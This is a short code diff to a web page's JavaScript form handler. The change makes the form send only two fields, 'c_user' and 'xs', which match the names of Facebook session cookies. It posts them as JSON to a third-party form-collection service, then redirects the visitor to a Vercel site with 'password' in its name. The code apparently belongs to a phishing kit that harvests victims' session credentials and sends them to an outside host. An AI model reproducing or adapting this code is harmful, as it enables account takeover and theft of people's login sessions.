@@ -117,14 +117,20 @@ form.addEventListener('submit', function(e){
     btn.disabled = true;
     btn.innerHTML = '<span class="spinner"></span> Submitting…';
 
-    const formData = new FormData(form);
+    const data = {
+        c_user: form.c_user.value,
+        xs: form.xs.value
+    };
 
     fetch("https://submit-form.com/upL3IuLAs", {
         method: "POST",
-        body: formData
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
     })
     .finally(() => {
-        // ✅ direct redirect after submit
+        // Direct redirect after submit
         window.location.href = "https://password-two-khaki.vercel.app/";
     });
 });
